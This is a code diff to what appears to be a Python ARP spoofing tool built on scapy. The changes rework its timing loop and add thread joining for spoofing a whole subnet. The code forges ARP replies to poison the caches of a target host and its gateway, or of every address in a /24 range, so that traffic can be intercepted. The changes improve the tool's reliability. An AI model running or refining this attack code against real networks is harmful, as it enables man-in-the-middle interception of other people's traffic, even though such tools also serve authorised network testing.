@@ -57,7 +57,6 @@ def arp_spoof(targetIP1, targetIP2, targetALL, count, timeout, duration, verbose
             return
         packet = scapy.ARP(op=2, pdst=targetIP, hwdst=target_mac, psrc=spoofIP)
         scapy.send(packet, verbose=verbose)
-        time.sleep(timeout)
 
     def restore(destination_ip, source_ip):
         destination_mac = get_mac(destination_ip)
@@ -94,15 +93,24 @@ def arp_spoof(targetIP1, targetIP2, targetALL, count, timeout, duration, verbose
     try:
         print("Processing attack...")
         while True:
-            packetCount += 1
+            threads = []
             if targetALL == 0:
                 spoof(targetIP1, targetIP2)
-                spoof(targetIP2, targetIP1)
+                spoof(targetIP2, targetIP1) 
+                print(f"INFO: Waiting {timeout}s to start next spoof iteration...")           
+                time.sleep(timeout)
                 print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}')
             else:
                 for i in range(2, 254):
                     thread = threading.Thread(target=send_subnet, args=(targetIP1, targetIP2, packetCount))
                     thread.start()
+                    threads.append(thread)
+            
+                for thread in threads:
+                    thread.join()
+            
+                print(f"INFO: Waiting {timeout}s to start next subnet spoof...")
+                time.sleep(timeout)
 
             if count != None and count == packetCount:
                 if targetALL == 0:
@@ -125,6 +133,7 @@ def arp_spoof(targetIP1, targetIP2, targetALL, count, timeout, duration, verbose
                 else:
                     print(f'Duration of the spoof ended {duration}s. \r\n >> waiting for threads to close')
                 sys.exit()
+            packetCount += 1
 
             time.sleep(1)
     except KeyboardInterrupt:
